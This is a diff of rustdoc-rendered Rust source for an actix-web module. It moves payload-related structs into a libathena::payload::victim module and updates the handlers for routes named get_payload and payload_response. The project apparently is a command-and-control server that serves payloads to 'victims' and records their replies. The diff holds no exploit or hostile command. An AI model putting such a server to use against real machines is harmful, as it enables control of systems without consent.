@@ -116,24 +116,6 @@
 <span id="113">113</span>
 <span id="114">114</span>
 <span id="115">115</span>
-<span id="116">116</span>
-<span id="117">117</span>
-<span id="118">118</span>
-<span id="119">119</span>
-<span id="120">120</span>
-<span id="121">121</span>
-<span id="122">122</span>
-<span id="123">123</span>
-<span id="124">124</span>
-<span id="125">125</span>
-<span id="126">126</span>
-<span id="127">127</span>
-<span id="128">128</span>
-<span id="129">129</span>
-<span id="130">130</span>
-<span id="131">131</span>
-<span id="132">132</span>
-<span id="133">133</span>
 </pre><div class="example-wrap"><pre class="rust ">
 <span class="comment">/*
  * Copyright (C) 2021  Aravinth Manivannan &lt;realaravinth@batsense.net&gt;
@@ -153,7 +135,7 @@
  */</span>
 <span class="kw">use</span> <span class="ident">actix_identity::Identity</span>;
 <span class="kw">use</span> <span class="ident">actix_web</span>::{<span class="ident">web</span>, <span class="ident">HttpResponse</span>, <span class="ident">Responder</span>};
-<span class="kw">use</span> <span class="ident">serde</span>::{<span class="ident">Deserialize</span>, <span class="ident">Serialize</span>};
+<span class="kw">use</span> <span class="ident">libathena::payload::victim</span>::<span class="kw-2">*</span>;
 
 <span class="comment">//use crate::errors::*;</span>
 <span class="kw">use</span> <span class="kw">crate</span><span class="ident">::AppData</span>;
@@ -187,18 +169,6 @@
     <span class="ident">HttpResponse::Ok</span>()
 }
 
-<span class="attribute">#[<span class="ident">derive</span>(<span class="ident">Clone</span>, <span class="ident">Debug</span>, <span class="ident">Serialize</span>, <span class="ident">Deserialize</span>)]</span>
-<span class="kw">pub</span> <span class="kw">struct</span> <span class="ident">Payload</span> {
-    <span class="kw">pub</span> <span class="ident">id</span>: <span class="ident">i32</span>,
-    <span class="kw">pub</span> <span class="ident">payload_type</span>: <span class="ident">String</span>,
-    <span class="kw">pub</span> <span class="ident">payload</span>: <span class="ident">String</span>,
-}
-
-<span class="attribute">#[<span class="ident">derive</span>(<span class="ident">Clone</span>, <span class="ident">Debug</span>, <span class="ident">Serialize</span>, <span class="ident">Deserialize</span>)]</span>
-<span class="kw">pub</span> <span class="kw">struct</span> <span class="ident">PayloadResponse</span> {
-    <span class="ident">payloads</span>: <span class="ident">Vec</span><span class="op">&lt;</span><span class="ident">Payload</span><span class="op">&gt;</span>,
-}
-
 <span class="attribute">#[<span class="ident">my_codegen::post</span>(
     <span class="ident">path</span> <span class="op">=</span> <span class="string">&quot;crate::V1_ROUTES.victim.get_payload.strip_prefix(crate::V1_ROUTES.victim.scope).unwrap()&quot;</span>
 )]</span>
@@ -224,7 +194,7 @@
     .<span class="kw">await</span>
     .<span class="ident">unwrap</span>();
 
-    <span class="kw">let</span> <span class="kw-2">mut</span> <span class="ident">resp</span> <span class="op">=</span> <span class="ident">PayloadResponse</span> {
+    <span class="kw">let</span> <span class="kw-2">mut</span> <span class="ident">resp</span> <span class="op">=</span> <span class="ident">PayloadCollection</span> {
         <span class="ident">payloads</span>: <span class="ident">Vec::new</span>(),
     };
     <span class="kw">if</span> <span class="op">!</span><span class="ident">data</span>.<span class="ident">is_empty</span>() {
@@ -234,18 +204,12 @@
     <span class="ident">HttpResponse::Ok</span>().<span class="ident">json</span>(<span class="ident">resp</span>)
 }
 
-<span class="attribute">#[<span class="ident">derive</span>(<span class="ident">Clone</span>, <span class="ident">Debug</span>, <span class="ident">Serialize</span>, <span class="ident">Deserialize</span>)]</span>
-<span class="kw">pub</span> <span class="kw">struct</span> <span class="ident">VictimPayloadResponse</span> {
-    <span class="kw">pub</span> <span class="ident">id</span>: <span class="ident">i32</span>,
-    <span class="kw">pub</span> <span class="ident">response</span>: <span class="ident">String</span>,
-}
-
 <span class="attribute">#[<span class="ident">my_codegen::post</span>(
     <span class="ident">path</span> <span class="op">=</span> <span class="string">&quot;crate::V1_ROUTES.victim.payload_response.strip_prefix(crate::V1_ROUTES.victim.scope).unwrap()&quot;</span>
 )]</span>
 <span class="kw">async</span> <span class="kw">fn</span> <span class="ident">payload_response</span>(
     <span class="ident">data</span>: <span class="ident">AppData</span>,
-    <span class="ident">payload</span>: <span class="ident">web::Json</span><span class="op">&lt;</span><span class="ident">VictimPayloadResponse</span><span class="op">&gt;</span>,
+    <span class="ident">payload</span>: <span class="ident">web::Json</span><span class="op">&lt;</span><span class="ident">PayloadResult</span><span class="op">&gt;</span>,
     <span class="ident">id</span>: <span class="ident">Identity</span>,
     <span class="comment">//) -&gt; ServiceResult&lt;impl Responder&gt; {</span>
 ) <span class="op">-</span><span class="op">&gt;</span> <span class="kw">impl</span> <span class="ident">Responder</span> {
